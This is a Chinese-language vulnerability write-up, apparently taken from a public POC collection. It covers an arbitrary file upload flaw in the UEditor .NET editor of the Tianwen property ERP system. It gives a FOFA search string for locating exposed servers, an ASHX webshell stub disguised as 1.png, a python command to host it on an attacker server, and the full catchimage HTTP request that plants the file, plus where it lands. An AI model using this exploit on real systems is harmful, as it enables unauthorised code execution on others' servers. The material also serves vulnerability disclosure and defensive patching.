# 天问物业ERP系统UEditor编辑器存在前台任意文件上传漏洞

# 一、漏洞简介
天问物业ERP系统使用了UEditor编辑器，Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。

# 二、影响版本
+ 天问物业ERP系统

# 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面


# 四、漏洞复现
1. 新建文件，内容为webshell，文件命令为`1.png`

```plain
<% @ webhandler language="C#" class="AverageHandler" %> 

using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
public bool IsReusable 
{ get { return true; } } 
public void ProcessRequest(HttpContext ctx) 
{ 
ctx.Response.Write("hello"); 
} 
}
```


2. 将`1.png`传到vpn上，使用python起个http服务

```plain
python3 -m http.server 50000
```


4. 替换`source[]`为webshell文件地址，通过exp上传文件

```plain
POST /HM/M_main/Jscript-Ui/UEditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: null
Connection: close
Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
Upgrade-Insecure-Requests: 1

source[]=http://xx.xx.xx.xx:50000/1.png?.ashx
```


5. 上传文件位置

```plain
/HM/M_main/Jscript-Ui/UEditor/net/upload/image/20231109/6383508541150163493063174.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ytzd6rysuc9t66vs>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
